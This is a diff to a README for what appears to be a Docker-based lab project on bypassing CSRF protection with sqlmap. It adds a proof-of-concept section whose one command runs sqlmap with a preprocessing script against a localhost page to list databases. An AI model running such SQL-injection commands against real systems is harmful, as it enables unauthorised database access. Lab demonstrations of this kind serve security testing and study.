@@ -7,7 +7,12 @@ git clone https://github.com/itasahobby/CSRF_SQLMap_Bypass.git
 docker-compose -f .\docker\docker-compose.yaml up --build
 ```
 
-### Writeup
+### PoC
+
+Run the following sqlmap command:
+```
+sqlmap -u "http://localhost/index.php?action=0" --method GET --preprocess ./poc/preprocess.py --batch --dbs
+```
 
 There is a more in depth writeup in my [blog]().
 ### Mentions
